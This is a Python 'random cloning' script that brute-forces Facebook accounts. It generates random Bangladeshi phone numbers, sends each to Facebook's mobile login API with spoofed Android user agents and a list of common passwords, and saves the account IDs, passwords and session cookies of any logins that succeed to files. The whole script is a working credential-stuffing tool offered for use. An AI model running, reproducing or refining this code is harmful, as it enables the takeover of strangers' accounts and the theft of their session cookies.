#====Module====#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#====Color code====#
RED= '\033[1;91m'
green = '\033[1;92m'
gren = '\x1b[38;5;46m'
gre = '\x1b[38;5;47m'
gr = '\x1b[38;5;48m'
grr = '\x1b[38;5;49m'
yollow = '\033[1;93m'
blow = '\033[1;96m'
white = '\033[1;97m'
#====Loop====#
loop = 0
oks=[]
cps=[]
method=[]
ugen=[]
#=====Logo===≠#
logo=(f"""
           {green}█████  ██   ██ ██████  
          {green}██   ██  ██ ██  ██   ██ 
          {green}███████   ███   ██████  
          {green}██   ██  ██ ██  ██   ██ 
          {green}██   ██ ██   ██ ██   ██
{green}×××××××××××××××××××××××××××××××××××××××××××××××××
{green}× {green}[=] CREATOR  : ALINUR RAHMAN
{green}× {green}[=] FACEBOOK : ALINUR RAHMAN
{green}× {blow}[=] GITHUB   : ALINUR-404
{green}× {yollow}[=] TOOLS    : RANDOM
{green}×××××××××××××××××××××××××××××××××××××××××××××××××""")
#====ua====#
def gift():
	moel=random.choice(["LE2113","BE2029","BE2025","BE2026","BE2028","NE2210","NE2211","NE2213","NE2215","NE2217","GM1911","GM1913","GM1917","GM1910","GM1915","CPH2469","BE2013","BE2015","BE2011","BE2012","DN2101","DN2103"])
	ua="[FBAN/FB4A;FBAV/"+str(random.randint(9,100))+".0.0."+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";FBDM/"+"{density=3.0,width=1080,height=2165}"+f";FBLC/it_IT;FBRV/526139383;FBCR/TIM;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/{moel};FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
	return ua
#====def_Main====#  
def Main():
	os.system("clear");print(logo)
	print(f'{green}×{green} [1] BD RANDOM CLONING ')
	print(f'{green}×{gren} [2] CONTACT TOOLS ADMIN')
	print(f'{blow}× [0] EXIT ')
	print(f'{green}×××××××××××××××××××××××××××××××××××××××××××××××××')
	ss = input(f'{yollow}× > Select Option : ')
	if ss in ['1','q']:
		Bangla()
	elif ss =='2':
		os.system('xdg-open https://www.facebook.com/alinur918604?mibextid=ZbWKwL')
		Main()
	elif ss =='0':
		sys.exit()
	else:
		print(f' Select Correct Option ')
		Main()
#====Random _Def====#
def Bangla():
	user=[]
	os.system("clear");print(logo)
	print(f'{green}× {blow}BD SIM CODE : {green}017/019/018/016')
	code = input(f'{green}×{yollow} > Select Code : ')
	print(f'{green}× {blow}LIMIT :{green} 1000/2000/5000/10000')
	limit = int(input(f'{green}× {yollow}> Choice Limit : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=30) as ema:
		os.system("clear");print(logo);tl = str(len(user))
		print(f'{green}× SIM CODE : {code}')
		print(f'{green}× TOTAL CRACK : '+tl)
		print(f'{green}×××××××××××××××××××××××××××××××××××××××××××××××××')
		for love in user:
			uid = code+love
			pwx = [love, 'bangladesh', 'Free Fire', 'jannat', 'iloveallah', 'mimmim', 'Bangla']
			ema.submit(graph,uid,pwx,tl)
	print(f'{green}× CLONING COMPILITE BABY')
	print(f'{green}× TOTAL OK ID : '+str(len(oks)))
	print(f'{green}×××××××××××××××××××××××××××××××××××××××××××××××××')
#=====update _Method====#
def graph(uid,pwx,tl):
    global loop,oks,cps
    bh = random.choice([yollow,white,green,RED,blow])
    sys.stdout.write(f'\r\r {white}[{green}ALINUR{white}]{blow} •{white} [{grr}%s|%s{white}]{blow} • {white}[{gre}OK-%s{white}]\033[1;35m \r'%(loop,tl,len(oks)));sys.stdout.flush()
    try:
        for pas in pwx:
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': uid,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent': gift(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                kuki = po["session_cookies"]
                cok = {}
                for x in kuki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                uid = re.findall('c_user=(.*);xs', kuki)[0]
                print('\r\r\033[38;5;46m [ALINUR-OK]\x1b[38;5;46m '+uid+' | '+pas+'\033[1;97m')
                print("\r\r\033[1;36m COOKIES [💐] :\x1b[38;5;49m "+kuki)
                open('/sdcard/OPEN-OK.txt', 'a').write(uid+' • '+pas+'\n''COOKIE[??]:'  +kuki+' \n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in po['error']['message']:
            	uid = re.findall('c_user=(.*);xs', kuki)[0]
            	print('\r\r\x1b[38;5;205m [ALINUR-CP] \x1b[38;5;205m'+uid+' | '+pas+'\033[1;97m')
            	open('/sdcard/CP.txt','a').write(uid+'|'+pas+'\n')
            	break
            	cps.append(uid)
            else:continue
        loop+=1
    except Exception as e:
        pass
Main()